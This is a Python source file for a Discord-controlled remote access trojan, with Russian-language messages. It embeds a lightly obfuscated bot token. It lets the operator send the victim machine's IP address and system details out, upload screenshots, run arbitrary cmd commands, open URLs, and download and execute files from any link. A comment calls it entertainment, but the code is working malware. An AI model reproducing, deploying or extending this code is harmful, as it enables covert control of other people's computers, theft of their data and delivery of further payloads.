import os
import discord
from discord.ext import commands
import pyscreenshot
import datetime
import platform
import urllib.request
import webbrowser

os.chdir("C:\\Users\\Public\\Downloads")

loh = "ODQ"

token = f"MTM4MDQ0MDcz{loh}yMDIyODE1Nw.GCdO-i.tRcmTfECw7ZELX-c-8IhJKxg4M9U2Dwe_dhvmI"

PREFIX = "/"
intents = discord.Intents.default()
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

@bot.event
async def on_command_error(ctx, error):
    await ctx.send(f"**Ошибка:** `{str(error)}`")

@bot.tree.command(description="Информация о пользователе")
@commands.is_owner()
async def info(interaction: discord.Interaction):
    user_time = datetime.datetime.now().strftime("%Y:%m:%d %H:%M:%S")
    user_os = platform.system()
    user_name = platform.node()
    user_machine = platform.machine()

    try:
        ip = urllib.request.urlopen("https://api.ipify.org").read().decode("utf-8")

        await interaction.response.send_message(f'**IP пользователя:** `{ip}`\n'
                        f'**Время пользователя:** `{user_time}`\n'
                        f'**ОС ИНФО пользователя: OS:** `{user_os}`, **NAME:** `{user_name}`, **PLATFORM:** `{user_machine}`')
    except Exception as e:
        await interaction.response.send_message(f"**Что-то пошло не так. Ошибка:** `{e}`")

@bot.tree.command(description="Делает скриншот экрана и отправляет вам")
@commands.is_owner()
async def image(interaction: discord.Interaction):
    try:
        image_grab = pyscreenshot.grab()
        image_grab.save("screen.png")
        with open("screen.png", "rb") as file:
            await interaction.response.send_message(file=discord.File(file, filename="screen.png"))
        os.remove("screen.png")
    except Exception as e:
        await interaction.response.send_message(f"**Ошибка:** `{e}`")

@bot.tree.command(description="Открывает ссылку")
@commands.is_owner()
async def open_web(interaction: discord.Interaction, url: str):
    try:
        webbrowser.open(url)
        await interaction.response.send_message(f"**Сайт `{url}` запущен.**")
    except Exception as e:
        await interaction.response.send_message(f"**Ошибка:** `{e}`")

@bot.tree.command(description="Открывает игру в виде URI, вот пример: steam://rungameid/730")
@commands.is_owner()
async def open_game(interaction: discord.Interaction, message: str):
    try:
        os.startfile(message)
        await interaction.response.send_message(f"**Игра `{message}` запущена.**")
    except Exception as e:
        await interaction.response.send_message(f"**Ошибка:** `{e}`")

@bot.tree.command(description="После вызова команды укажите что вы хотите хотите выполнить в cmd")
@commands.is_owner()
async def cmd(interaction: discord.Interaction, *, message: str):
    try:
        output = f"**Команда** `{message}` **успешно выполнена**.\n"
        os.system(message)
        await interaction.response.send_message(output)
    except Exception as e:
        await interaction.response.send_message(f"**Ошибка:** `{e}` **(в общем, не удалось выполнить команду 😒)**")

@bot.tree.command(description="Скачивает файл и запускает его по вашему желанию")
@commands.is_owner()
# Помните, всё сделано в развлекательных целях.
# После вызова команды вы должны: указать ссылку на скачивание файла и после этого указать False или True
# ИМЕННО ТАК, НИКАК ИНАЧЕ False=не открывать файл, True=открыть файл.
async def start(interaction: discord.Interaction, url: str, name: str, true_or_false: bool):
    try:
        urllib.request.urlretrieve(url, name)
        message = f"**Файл** `{name}` **успешно загружен!**"
        if true_or_false:
            os.startfile(name)
            message += " **и запущен!**"

        await interaction.response.send_message(message)
    except Exception as e:
        await interaction.response.send_message(f"**Ошибка:** `{e}`")

bot.run(token)

bot.run(token)
